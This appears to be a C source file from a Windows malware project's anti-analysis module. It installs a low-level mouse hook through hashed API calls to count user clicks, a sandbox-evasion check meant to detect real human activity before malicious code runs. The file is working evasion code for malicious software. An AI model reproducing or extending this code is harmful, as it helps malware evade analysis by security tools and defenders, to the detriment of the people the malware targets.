#include "anti_analysis.h"

/* GLOBAL VARIABLES */
// global api hashing variable
extern API_HASHING g_Api;
// global hook handle variable
HHOOK g_hMouseHook = NULL;
// global mouse clicks counter
DWORD g_dwMouseClicks = NULL;

LRESULT CALLBACK HookEvent(int nCode, WPARAM wParam, LPARAM lParam) {

    // WM_RBUTTONDOWN :         "Right Mouse Click"
    // WM_LBUTTONDOWN :         "Left Mouse Click"
    // WM_MBUTTONDOWN :         "Middle Mouse Click"

    if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN) {
        DebugPrint("[+] Mouse Click Recorded \n");
        g_dwMouseClicks++;
    }

    return g_Api.pCallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
}

BOOL MouseClicksLogger() {

    MSG         Msg = { 0 };

    // installing hook 
    g_hMouseHook = g_Api.pSetWindowsHookExW(
        WH_MOUSE_LL,
        (HOOKPROC)HookEvent,
        NULL,
        NULL
    );
    if (!g_hMouseHook) {
        DebugPrint("[!] SetWindowsHookExW Failed With Error : %d \n", GetLastError());
    }

    // process unhandled events
    while (g_Api.pGetMessageW(&Msg, NULL, NULL, NULL)) {
		g_Api.pDefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
    }

    return TRUE;
}
